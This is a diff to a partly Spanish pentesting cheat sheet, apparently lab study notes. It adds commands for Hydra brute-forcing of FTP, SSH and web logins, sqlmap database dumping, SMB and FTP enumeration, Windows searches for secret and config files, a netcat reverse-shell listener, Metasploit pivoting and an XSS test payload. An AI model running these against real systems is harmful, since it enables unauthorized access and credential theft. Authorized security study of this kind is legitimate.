@@ -9,15 +9,6 @@ nmap -sn 10.10.10.0/24
 ```sql
 fping -a -g 10.10.10.0/24 2>/dev/null
 ```
-# Pivoting
-## Ip Route
-```sql
-ip route add 10.10.16.0/24 via 10.10.16.1 dev tap0
-```
-## Metasploit
-```sql
-run autoroute -s 10.10.16.0/24
-```
 # Password cracking
 ## John
 ```python
@@ -28,7 +19,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 # Dump Hashes
 ## unshadow 
 ```sql
-unshadow passwd shadow > unshadowed.txt
+unshadow passwd shadow > hashes.txt
 ```
 # Fuzzing
 ## Nmap
@@ -54,4 +45,75 @@ sqlmap -u "http://10.10.14.12/file.php?id=1" -p id
 sqlmap -u "http://10.10.14.12/file.php?id=1" -p id --dbs
 sqlmap -u "http://10.10.14.12/file.php?id=1" -p id -D dbname --tables
 sqlmap -u "http://10.10.14.12/file.php?id=1" -p id -D dbname -T table_name --dump
+```
+# Hydra
+```sql
+hydra -v -l admin -P passlist.txt ftp://192.168.0.1
+hydra -v -L userlist.txt -P passlist.txt ftp://192.168.0.1
+hydra -v -l root -P passwords.txt -t 1 -u 10.10.14.10 ssh
+hydra http://10.10.14.10/ http-post-form "/login.php:user=^USER^&password=^PASS^:Incorrect" -L userlist.txt -P passwordslist.txt
+```
+# XSS
+```sql
+<script>alert(xss)</script>
+<h1>H1</h1>
+```
+# SMB
+## Enumeración de SMB
+```sql
+smbclient -L 10.10.14.12 -N
+smbmap -H 10.10.14.12 -u 'null'
+nmap --script=smb-vuln* -p445 10.10.14.15 -oN smbScan
+smbmap -H 10.10.14.15 -R backups -u 'null'
+```
+## Acceso al recurso compartido **backups**
+```sql
+smbclient //10.10.14.15/backups
+```
+# FTP
+## Enumeración de FTP
+```sql
+nmap --script=ftp-anon -p21 10.10.14.12
+ftp 10.10.14.12
+cd ..
+```
+## FTP - Fuerza Bruta
+```sql
+hydra -l admin -P passlist.txt ftp://192.168.0.1
+hydra -L userlist.txt -P passlist.txt ftp://192.168.0.1
+```
+# Enumeracíon de windows
+```sql
+dir /b/s "\*.conf*"
+dir /b/s "\*.txt*"
+dir /b/s "\*secret*"
+route print
+netstat -r
+fsutil fsinfo drives
+wmic logicaldisk get Caption,Description,providername
+```
+# Reverse Shell
+## nc
+```sql
+nc -nlvp 443
+```
+## metasploit
+```sql
+msfconsole
+```
+# Post Explotación
+## Pivoting
+### Ip Route
+```sql
+ip route add 10.10.16.0/24 via 10.10.16.1 dev tap0
+```
+### Metasploit
+```sql
+run autoroute -s 10.10.16.0/24
+```
+## Wireshark
+```sql
+ip.addr==192.168.12
+ip.src == 192.168.2.11
+ip.dst == 192.168.2.15
 ```
